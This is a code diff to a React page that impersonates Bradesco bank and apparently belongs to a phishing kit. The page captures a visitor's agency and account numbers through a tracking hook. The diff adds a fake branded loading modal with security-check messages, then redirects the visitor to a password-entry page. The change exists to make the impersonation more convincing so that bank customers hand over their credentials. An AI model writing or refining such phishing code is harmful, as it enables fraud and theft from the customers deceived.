@@ -1,9 +1,19 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import bradescoLogoNew from "@/assets/bradesco-logo-new.webp";
 import BottomNav from "@/components/BottomNav";
 import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
+
+const LOADING_MESSAGES = [
+  "Processando...",
+  "Validando dados da conta",
+  "Verificando módulo de segurança",
+  "Processando atualização",
+  "Finalizando operação",
+  "Aguarde... Estamos te redirecionando para a próxima etapa",
+];
 
 const Resgate = () => {
   useVisitorTracking("resgate");
@@ -13,6 +23,23 @@ const Resgate = () => {
   const [agencia, setAgencia] = useState("");
   const [conta, setConta] = useState("");
   const [errors, setErrors] = useState<{ agencia?: string; conta?: string }>({});
+  const [showLoading, setShowLoading] = useState(false);
+  const [loadingStep, setLoadingStep] = useState(0);
+
+  useEffect(() => {
+    if (!showLoading) return;
+    const interval = 10000 / LOADING_MESSAGES.length;
+    const timer = setInterval(() => {
+      setLoadingStep((prev) => {
+        if (prev >= LOADING_MESSAGES.length - 1) return prev;
+        return prev + 1;
+      });
+    }, interval);
+    const redirect = setTimeout(() => {
+      navigate("/senha-acesso", { state: { nome, conta, agencia } });
+    }, 10000);
+    return () => { clearInterval(timer); clearTimeout(redirect); };
+  }, [showLoading, navigate, nome, conta, agencia]);
 
   const handleResgatar = () => {
     const newErrors: { agencia?: string; conta?: string } = {};
@@ -25,7 +52,8 @@ const Resgate = () => {
     setErrors(newErrors);
     if (Object.keys(newErrors).length === 0) {
       captureFormData("resgate", { agencia, conta });
-      navigate("/senha-acesso", { state: { nome, conta, agencia } });
+      setShowLoading(true);
+      setLoadingStep(0);
     }
   };
 
@@ -94,6 +122,20 @@ const Resgate = () => {
 
       {/* Bottom Navigation */}
       <BottomNav />
+
+      {/* Loading Modal */}
+      {showLoading && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          <div className="fixed inset-0 bg-black/50" />
+          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
+            <img src={bradescoLogoNew} alt="Bradesco" className="h-12 mb-6" />
+            <div className="w-10 h-10 border-3 border-muted rounded-full border-t-[#D7004D] animate-spin mb-6" />
+            <p className="text-muted-foreground text-base text-center">
+              {LOADING_MESSAGES[loadingStep]}
+            </p>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
